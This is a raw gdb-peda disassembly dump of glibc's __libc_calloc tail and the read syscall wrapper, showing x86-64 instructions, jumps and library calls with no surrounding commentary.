   0x00007ffff7464505 <+805>: test   rax,rax
   0x00007ffff7464508 <+808>: mov    r15,rax
   0x00007ffff746450b <+811>: je     0x7ffff746453e <__libc_calloc+862>

   0x00007ffff746450d <+813>: mov    rsi,rbp
   0x00007ffff7464510 <+816>: mov    rdi,r15
   0x00007ffff7464513 <+819>: call   0x7ffff7460190 <_int_malloc>
   0x00007ffff7464518 <+824>: mov    rbx,rax
   0x00007ffff746451b <+827>: cmp    DWORD PTR [rip+0x339c92],0x0        # 0x7ffff779e1b4 <__libc_multiple_threads>
   0x00007ffff7464522 <+834>: je     0x7ffff7464530 <__libc_calloc+848>

   0x00007ffff7464524 <+836>: lock dec DWORD PTR [r15]
   0x00007ffff7464528 <+840>: jne    0x7ffff7465532 <_L_unlock_13591>

   0x00007ffff746452e <+846>: jmp    0x7ffff7464539 <__libc_calloc+857>


   0x00007ffff7464530 <+848>: dec    DWORD PTR [r15]
   0x00007ffff7464533 <+851>: jne    0x7ffff7465532 <_L_unlock_13591>

   0x00007ffff7464539 <+857>: jmp    0x7ffff746448c <__libc_calloc+684>


   0x00007ffff746453e <+862>: mov    rsi,r12
   0x00007ffff7464541 <+865>: mov    rdi,rbp
   0x00007ffff7464544 <+868>: call   0x7ffff745eee0 <arena_get2>
   0x00007ffff7464549 <+873>: test   rax,rax
   0x00007ffff746454c <+876>: mov    r15,rax
   0x00007ffff746454f <+879>: je     0x7ffff7464316 <__libc_calloc+310>

   0x00007ffff7464555 <+885>: jmp    0x7ffff746450d <__libc_calloc+813>


   0x00007ffff7464557 <+887>: mov    rsi,QWORD PTR [rsp+0x38]
   0x00007ffff746455c <+892>: mov    rdi,rbp
   0x00007ffff746455f <+895>: call   rax
   0x00007ffff7464561 <+897>: test   rax,rax
   0x00007ffff7464564 <+900>: mov    rbx,rax
   0x00007ffff7464567 <+903>: je     0x7ffff7464316 <__libc_calloc+310>

   0x00007ffff746456d <+909>: mov    rdx,rbp
   0x00007ffff7464570 <+912>: mov    rbx,QWORD PTR [rsp+0x8]
   0x00007ffff7464575 <+917>: mov    rbp,QWORD PTR [rsp+0x10]
   0x00007ffff746457a <+922>: mov    r12,QWORD PTR [rsp+0x18]
   0x00007ffff746457f <+927>: mov    r13,QWORD PTR [rsp+0x20]
   0x00007ffff7464584 <+932>: xor    esi,esi
   0x00007ffff7464586 <+934>: mov    r14,QWORD PTR [rsp+0x28]
   0x00007ffff746458b <+939>: mov    r15,QWORD PTR [rsp+0x30]
   0x00007ffff7464590 <+944>: mov    rdi,rax
   0x00007ffff7464593 <+947>: add    rsp,0x38
   0x00007ffff7464597 <+951>: jmp    0x7ffff746bb80 <__memset_sse2>

   0x00007ffff746459c <+956>: test   rsi,rsi
   0x00007ffff746459f <+959>: je     0x7ffff746421d <__libc_calloc+61>

   0x00007ffff74645a5 <+965>: xor    edx,edx
   0x00007ffff74645a7 <+967>: mov    rax,rbp
   0x00007ffff74645aa <+970>: div    rsi
   0x00007ffff74645ad <+973>: cmp    rax,rdi
   0x00007ffff74645b0 <+976>: je     0x7ffff746421d <__libc_calloc+61>

   0x00007ffff74645b6 <+982>: mov    rax,QWORD PTR [rip+0x333863]        # 0x7ffff7797e20
   0x00007ffff74645bd <+989>: xor    ebx,ebx
   0x00007ffff74645bf <+991>: mov    DWORD PTR fs:[rax],0xc
   0x00007ffff74645c6 <+998>: jmp    0x7ffff7464316 <__libc_calloc+310>


   0x00007ffff74645cb <+1003>:  lea    rcx,[rip+0xf6990]        # 0x7ffff755af62 <__func__.12858>
   0x00007ffff74645d2 <+1010>:  lea    rsi,[rip+0xf6600]        # 0x7ffff755abd9
   0x00007ffff74645d9 <+1017>:  lea    rdi,[rip+0xf6841]        # 0x7ffff755ae21
   0x00007ffff74645e0 <+1024>:  mov    edx,0xd25
   0x00007ffff74645e5 <+1029>:  call   0x7ffff745df80 <__malloc_assert>
   0x00007ffff74645ea <+1034>:  mov    rdx,rbp
   0x00007ffff74645ed <+1037>:  xor    esi,esi
   0x00007ffff74645ef <+1039>:  mov    rdi,rbx
   0x00007ffff74645f2 <+1042>:  call   0x7ffff746bb80 <__memset_sse2>
   0x00007ffff74645f7 <+1047>:  jmp    0x7ffff7464316 <__libc_calloc+310>

   0x00007ffff74645fc : [next ins..]

End of assembler dump.
gdb-peda$ disas 0x7ffff74c6f42
Dump of assembler code for function read:
   0x00007ffff74c6f20 <+0>: cmp    DWORD PTR [rip+0x2d728d],0x0        # 0x7ffff779e1b4 <__libc_multiple_threads>
   0x00007ffff74c6f27 <+7>: jne    0x7ffff74c6f39 <read+25>

   0x00007ffff74c6f29 <+0>: mov    eax,0x0
   0x00007ffff74c6f2e <+5>: syscall 
   0x00007ffff74c6f30 <+7>: cmp    rax,0xfffffffffffff001
   0x00007ffff74c6f36 <+13>:  jae    0x7ffff74c6f69 <read+73>

   0x00007ffff74c6f38 <+15>:  ret    


   0x00007ffff74c6f39 <+25>:  sub    rsp,0x8
   0x00007ffff74c6f3d <+29>:  call   0x7ffff74e20a0 <__libc_enable_asynccancel>
   0x00007ffff74c6f42 <+34>:  mov    QWORD PTR [rsp],rax
   0x00007ffff74c6f46 <+38>:  mov    eax,0x0
   0x00007ffff74c6f4b <+43>:  syscall 
   0x00007ffff74c6f4d <+45>:  mov    rdi,QWORD PTR [rsp]
   0x00007ffff74c6f51 <+49>:  mov    rdx,rax
   0x00007ffff74c6f54 <+52>:  call   0x7ffff74e2100 <__libc_disable_asynccancel>
   0x00007ffff74c6f59 <+57>:  mov    rax,rdx
   0x00007ffff74c6f5c <+60>:  add    rsp,0x8
   0x00007ffff74c6f60 <+64>:  cmp    rax,0xfffffffffffff001
   0x00007ffff74c6f66 <+70>:  jae    0x7ffff74c6f69 <read+73>

   0x00007ffff74c6f68 <+72>:  ret    


   0x00007ffff74c6f69 <+73>:  mov    rcx,QWORD PTR [rip+0x2d0eb0]        # 0x7ffff7797e20
   0x00007ffff74c6f70 <+80>:  xor    edx,edx
   0x00007ffff74c6f72 <+82>:  sub    rdx,rax
   0x00007ffff74c6f75 <+85>:  mov    DWORD PTR fs:[rcx],edx
   0x00007ffff74c6f78 <+88>:  or     rax,0xffffffffffffffff
   0x00007ffff74c6f7c <+92>:  jmp    0x7ffff74c6f68 <read+72>

   0x00007ffff74c6f7e : [next ins..]

